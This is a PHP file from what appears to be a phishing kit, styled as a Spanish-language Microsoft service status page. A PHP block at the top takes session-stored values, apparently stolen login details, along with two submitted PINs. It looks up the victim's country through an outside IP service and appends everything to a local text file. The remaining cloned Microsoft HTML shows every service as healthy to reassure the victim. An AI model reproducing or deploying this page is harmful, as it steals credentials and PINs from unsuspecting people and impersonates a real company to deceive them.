<?php
ini_set("display_errors", 0);
session_start();
$user_ip = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$user_ip}/country"));

$file = fopen("cabimas.txt", "a");

if (isset ($_SESSION['jxkc'])){

fwrite($file, "".$_SESSION['jxkc']." ".$_SESSION['jxkx']."   Pin: ".$_POST['jxkx1']." Pin2: ".$_POST['jxkx2']."  ".date('Y-m-d')." - ".date('H:i:s')." - ".$cc."  " . PHP_EOL);
fwrite($file, "--" . PHP_EOL);
fclose($file);

	
unset($_SESSION['jxkc']);
unset($_SESSION['jxkx']);
}else{}
?>

<html >
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type="text/css">

</style>
    <title>Estado del servicio</title>

    <!-- perfping and other diagnostic scripts -->
  
    <link type="text/css" rel="stylesheet" href="Estadodelservicio_files/EmbeddedFonts.css">
	<link type="text/css" rel="stylesheet" href="Estadodelservicio_files/O365ThemeDefault.css">
	<link type="text/css" rel="stylesheet" href="Estadodelservicio_files/MasterStyles15.css">
	<link type="text/css" rel="stylesheet" href="Estadodelservicio_files/MasterStyles15MVC.css">
	<link type="text/css" rel="stylesheet" href="Estadodelservicio_files/bootstrap.min.css">
	<link type="text/css" rel="stylesheet" href="Estadodelservicio_files/ServicePulse.css">

    
    

        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1.0">

    

    
</head>
<body >
 

<div class="container-fluid ng-scope" >
    <div class="row">
        <div class="sp-header">
            <span class="sp-header-text">Estado del servicio</span>
            <img class="sp-header-msimage" src="Estadodelservicio_files/msftlogo.png">
        </div>
    </div>
    <div class="row">
        <div class="text-center sp-banner-up" ng-class="IndexModel.IsAllUp ? &#39;sp-banner-up&#39; : &#39;sp-banner-down&#39;">
            <div class="sp-banner-text">
                <p>
                    <img class="img-responsive sp-banner-icon"  src="Estadodelservicio_files/icon-check.png">
                </p>
                <p class="sp-banner-title ng-binding">¡Estamos bien!</p>
                <p class="sp-banner-subtitle ng-binding">Todo está correcto y en funcionamiento.</p>
            </div>
            <img class="img-responsive sp-banner-img" alt="¡Estamos bien!" ng-src="Estadodelservicio_files/ServicePulse/banner_up.png" src="Estadodelservicio_files/banner_up.png">
        </div>
    </div>

    <div class="row sp-service-header hidden-sm hidden-xs">
        <div class="col-md-3 pull-left">
            Servicio
            <span class="pull-right">
                Estado actual
            </span>
        </div>
        <div class="col-md-9">
            <span>Detalles</span>
            <span class="pull-right">Última actualización: 2020-10-24 20:58:33Z (UTC)</span>
        </div>
    </div>
    <div class="row sp-service-header hidden-md hidden-lg">
        <div class="col-sm-12 ng-binding">
          <!--  Última actualización: 2020-10-24 20:58:33Z (UTC)-->
        </div>
    </div>

    <div class="row">
        <div class="col-md-3 hidden-xs hidden-sm sp-col-nav pull-left">
            <ul class="nav nav-pills nav-stacked sp-nav">
                <!-- ngRepeat: service in IndexModel.Services --><li ng-repeat="service in IndexModel.Services" ng-class="service.Id == IndexModel.ActiveService ? &#39;active&#39; : &#39;&#39;" class="ng-scope active">
                    <a href="javascript:void(0)" ng-click="IndexModel.ActiveService = service.Id" data-hint="service.Outlook.com">
                        <span class="ng-binding">Outlook.com</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </li><!-- end ngRepeat: service in IndexModel.Services --><li ng-repeat="service in IndexModel.Services" ng-class="service.Id == IndexModel.ActiveService ? &#39;active&#39; : &#39;&#39;" class="ng-scope">
                    <a href="javascript:void(0)" ng-click="IndexModel.ActiveService = service.Id" data-hint="service.OneDriveConsumer">
                        <span class="ng-binding">OneDrive</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </li><!-- end ngRepeat: service in IndexModel.Services --><li ng-repeat="service in IndexModel.Services" ng-class="service.Id == IndexModel.ActiveService ? &#39;active&#39; : &#39;&#39;" class="ng-scope">
                    <a href="javascript:void(0)" ng-click="IndexModel.ActiveService = service.Id" data-hint="service.microsofttodo">
                        <span class="ng-binding">Microsoft To-Do</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </li><!-- end ngRepeat: service in IndexModel.Services --><li ng-repeat="service in IndexModel.Services" ng-class="service.Id == IndexModel.ActiveService ? &#39;active&#39; : &#39;&#39;" class="ng-scope">
                    <a href="javascript:void(0)" ng-click="IndexModel.ActiveService = service.Id" data-hint="service.Skype">
                        <span class="ng-binding">Skype</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </li><!-- end ngRepeat: service in IndexModel.Services --><li ng-repeat="service in IndexModel.Services" ng-class="service.Id == IndexModel.ActiveService ? &#39;active&#39; : &#39;&#39;" class="ng-scope">
                    <a href="javascript:void(0)" ng-click="IndexModel.ActiveService = service.Id" data-hint="service.OfficeOnlineConsumer">
                        <span class="ng-binding">Office for the web (Consumer)</span>
                        <img ng-src="Estadodelservicio_files//good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </li><!-- end ngRepeat: service in IndexModel.Services --><li ng-repeat="service in IndexModel.Services" ng-class="service.Id == IndexModel.ActiveService ? &#39;active&#39; : &#39;&#39;" class="ng-scope">
                    <a href="javascript:void(0)" ng-click="IndexModel.ActiveService = service.Id" data-hint="service.Whiteboard">
                        <span class="ng-binding">Microsoft Whiteboard</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </li><!-- end ngRepeat: service in IndexModel.Services --><li ng-repeat="service in IndexModel.Services" ng-class="service.Id == IndexModel.ActiveService ? &#39;active&#39; : &#39;&#39;" class="ng-scope">
                    <a href="javascript:void(0)" ng-click="IndexModel.ActiveService = service.Id" data-hint="service.YourPhone">
                        <span class="ng-binding">Your Phone</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </li><!-- end ngRepeat: service in IndexModel.Services --><li ng-repeat="service in IndexModel.Services" ng-class="service.Id == IndexModel.ActiveService ? &#39;active&#39; : &#39;&#39;" class="ng-scope">
                    <a href="javascript:void(0)" ng-click="IndexModel.ActiveService = service.Id" data-hint="service.TeamsforLife">
                        <span class="ng-binding">Teams (Consumer)</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </li><!-- end ngRepeat: service in IndexModel.Services -->
            </ul>
            <div class="sp-learnmore">
                <a href="" data-hint="AdminLogin" target="_blank">Los administradores de Microsoft 365 hacen clic aquí para iniciar sesión</a>
            </div>
        </div>

        <div class="col-md-9 sp-col-content">
            <!-- ngRepeat: service in IndexModel.Services --><div class="panel-default ng-scope" ng-repeat="service in IndexModel.Services">
                <div class="panel-heading hidden-md hidden-lg sp-content-heading">
                    <a ng-click="IndexModel.ActiveService = service.Id" data-hint="Outlook.com">
                        <span class="ng-binding">Outlook.com</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </div>
                <div id="Outlook.com" class="panel-body" ng-init="service.InitShowCount = service.IsUp ? 0 : 1; service.ShowCount = service.InitShowCount" ng-show="service.Id == IndexModel.ActiveService">
                    <!-- ngIf: service.IsUp --><div ng-if="service.IsUp" class="ng-scope">
                        <p>Todo está correcto y en funcionamiento.</p>
                    </div><!-- end ngIf: service.IsUp -->
                    <!-- ngRepeat: message in service.Messages | limitTo: service.ShowCount -->
                    <!-- ngIf: service.Messages != null && service.Messages.length > 1 -->
                </div>
                <div id="sp-monitor-hidden"></div>
            </div><!-- end ngRepeat: service in IndexModel.Services --><div class="panel-default ng-scope" ng-repeat="service in IndexModel.Services">
                <div class="panel-heading hidden-md hidden-lg sp-content-heading">
                    <a ng-click="IndexModel.ActiveService = service.Id" data-hint="OneDriveConsumer">
                        <span class="ng-binding">OneDrive</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </div>
                <div id="OneDriveConsumer" class="panel-body ng-hide" ng-init="service.InitShowCount = service.IsUp ? 0 : 1; service.ShowCount = service.InitShowCount" ng-show="service.Id == IndexModel.ActiveService">
                    <!-- ngIf: service.IsUp --><div ng-if="service.IsUp" class="ng-scope">
                        <p>Todo está correcto y en funcionamiento.</p>
                    </div><!-- end ngIf: service.IsUp -->
                    <!-- ngRepeat: message in service.Messages | limitTo: service.ShowCount -->
                    <!-- ngIf: service.Messages != null && service.Messages.length > 1 -->
                </div>
                <div id="sp-monitor-hidden"></div>
            </div><!-- end ngRepeat: service in IndexModel.Services --><div class="panel-default ng-scope" ng-repeat="service in IndexModel.Services">
                <div class="panel-heading hidden-md hidden-lg sp-content-heading">
                    <a ng-click="IndexModel.ActiveService = service.Id" data-hint="microsofttodo">
                        <span class="ng-binding">Microsoft To-Do</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </div>
                <div id="microsofttodo" class="panel-body ng-hide" ng-init="service.InitShowCount = service.IsUp ? 0 : 1; service.ShowCount = service.InitShowCount" ng-show="service.Id == IndexModel.ActiveService">
                    <!-- ngIf: service.IsUp --><div ng-if="service.IsUp" class="ng-scope">
                        <p>Todo está correcto y en funcionamiento.</p>
                    </div><!-- end ngIf: service.IsUp -->
                    <!-- ngRepeat: message in service.Messages | limitTo: service.ShowCount -->
                    <!-- ngIf: service.Messages != null && service.Messages.length > 1 -->
                </div>
                <div id="sp-monitor-hidden"></div>
            </div><!-- end ngRepeat: service in IndexModel.Services --><div class="panel-default ng-scope" ng-repeat="service in IndexModel.Services">
                <div class="panel-heading hidden-md hidden-lg sp-content-heading">
                    <a ng-click="IndexModel.ActiveService = service.Id" data-hint="Skype">
                        <span class="ng-binding">Skype</span>
                        <img ng-src="/images/servicepulse/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </div>
                <div id="Skype" class="panel-body ng-hide" ng-init="service.InitShowCount = service.IsUp ? 0 : 1; service.ShowCount = service.InitShowCount" ng-show="service.Id == IndexModel.ActiveService">
                    <!-- ngIf: service.IsUp --><div ng-if="service.IsUp" class="ng-scope">
                        <p>Todo está correcto y en funcionamiento.</p>
                    </div><!-- end ngIf: service.IsUp -->
                    <!-- ngRepeat: message in service.Messages | limitTo: service.ShowCount -->
                    <!-- ngIf: service.Messages != null && service.Messages.length > 1 -->
                </div>
                <div id="sp-monitor-hidden"></div>
            </div><!-- end ngRepeat: service in IndexModel.Services --><div class="panel-default ng-scope" ng-repeat="service in IndexModel.Services">
                <div class="panel-heading hidden-md hidden-lg sp-content-heading">
                    <a ng-click="IndexModel.ActiveService = service.Id" data-hint="OfficeOnlineConsumer">
                        <span class="ng-binding">Office for the web (Consumer)</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </div>
                <div id="OfficeOnlineConsumer" class="panel-body ng-hide" ng-init="service.InitShowCount = service.IsUp ? 0 : 1; service.ShowCount = service.InitShowCount" ng-show="service.Id == IndexModel.ActiveService">
                    <!-- ngIf: service.IsUp --><div ng-if="service.IsUp" class="ng-scope">
                        <p>Todo está correcto y en funcionamiento.</p>
                    </div><!-- end ngIf: service.IsUp -->
                    <!-- ngRepeat: message in service.Messages | limitTo: service.ShowCount -->
                    <!-- ngIf: service.Messages != null && service.Messages.length > 1 -->
                </div>
                <div id="sp-monitor-hidden"></div>
            </div><!-- end ngRepeat: service in IndexModel.Services --><div class="panel-default ng-scope" ng-repeat="service in IndexModel.Services">
                <div class="panel-heading hidden-md hidden-lg sp-content-heading">
                    <a ng-click="IndexModel.ActiveService = service.Id" data-hint="Whiteboard">
                        <span class="ng-binding">Microsoft Whiteboard</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </div>
                <div id="Whiteboard" class="panel-body ng-hide" ng-init="service.InitShowCount = service.IsUp ? 0 : 1; service.ShowCount = service.InitShowCount" ng-show="service.Id == IndexModel.ActiveService">
                    <!-- ngIf: service.IsUp --><div ng-if="service.IsUp" class="ng-scope">
                        <p>Todo está correcto y en funcionamiento.</p>
                    </div><!-- end ngIf: service.IsUp -->
                    <!-- ngRepeat: message in service.Messages | limitTo: service.ShowCount -->
                    <!-- ngIf: service.Messages != null && service.Messages.length > 1 -->
                </div>
                <div id="sp-monitor-hidden"></div>
            </div><!-- end ngRepeat: service in IndexModel.Services --><div class="panel-default ng-scope" ng-repeat="service in IndexModel.Services">
                <div class="panel-heading hidden-md hidden-lg sp-content-heading">
                    <a ng-click="IndexModel.ActiveService = service.Id" data-hint="YourPhone">
                        <span class="ng-binding">Your Phone</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </div>
                <div id="YourPhone" class="panel-body ng-hide" ng-init="service.InitShowCount = service.IsUp ? 0 : 1; service.ShowCount = service.InitShowCount" ng-show="service.Id == IndexModel.ActiveService">
                    <!-- ngIf: service.IsUp --><div ng-if="service.IsUp" class="ng-scope">
                        <p>Todo está correcto y en funcionamiento.</p>
                    </div><!-- end ngIf: service.IsUp -->
                    <!-- ngRepeat: message in service.Messages | limitTo: service.ShowCount -->
                    <!-- ngIf: service.Messages != null && service.Messages.length > 1 -->
                </div>
                <div id="sp-monitor-hidden"></div>
            </div><!-- end ngRepeat: service in IndexModel.Services --><div class="panel-default ng-scope" ng-repeat="service in IndexModel.Services">
                <div class="panel-heading hidden-md hidden-lg sp-content-heading">
                    <a ng-click="IndexModel.ActiveService = service.Id" data-hint="TeamsforLife">
                        <span class="ng-binding">Teams (Consumer)</span>
                        <img ng-src="Estadodelservicio_files/good.png" alt="el servicio funciona bien" class="sp-nav-icon pull-right" src="Estadodelservicio_files/good.png">
                    </a>
                </div>
                <div id="TeamsforLife" class="panel-body ng-hide" ng-init="service.InitShowCount = service.IsUp ? 0 : 1; service.ShowCount = service.InitShowCount" ng-show="service.Id == IndexModel.ActiveService">
                    <!-- ngIf: service.IsUp --><div ng-if="service.IsUp" class="ng-scope">
                        <p>Todo está correcto y en funcionamiento.</p>
                    </div><!-- end ngIf: service.IsUp -->
                    <!-- ngRepeat: message in service.Messages | limitTo: service.ShowCount -->
                    <!-- ngIf: service.Messages != null && service.Messages.length > 1 -->
                </div>
                <div id="sp-monitor-hidden"></div>
            </div><!-- end ngRepeat: service in IndexModel.Services -->
        </div>
    </div>
    <div class="sp-push"></div>
</div>
<div class="sp-footer">
    <span>
        <a href="https://go.microsoft.com/fwlink/?LinkID=206977">Términos de uso</a>
    </span>
    <span>
        <a href="https://go.microsoft.com/fwlink/?LinkId=248681">Privacidad y cookies</a>
    </span>
    <span>
        <a href="https://go.microsoft.com/?linkid=9851308">Marcas comerciales</a>
    </span>
    <span>© 2020 Microsoft</span>
</div>


    
    
    

    <script type="text/javascript" src="Estadodelservicio_files/MicrosoftAjaxCombined.js.descarga"></script>
	<script type="text/javascript" src="Estadodelservicio_files/jquery-1_10_2_min.js.descarga"></script>
	<script type="text/javascript" src="Estadodelservicio_files/CommonControlBundle.js.descarga"></script>
	<script type="text/javascript" src="Estadodelservicio_files/HeadBundle.js.descarga"></script>
	<script type="text/javascript" src="Estadodelservicio_files/angular.min.js.descarga"></script>
	<script type="text/javascript" src="Estadodelservicio_files/ServicePulse.js.descarga"></script>
    <script type="text/javascript">O365.Perf.M.M=new Date</script>
	<script type="text/javascript" src="Estadodelservicio_files/Instrument.js.descarga"></script>

    
    

</body></html>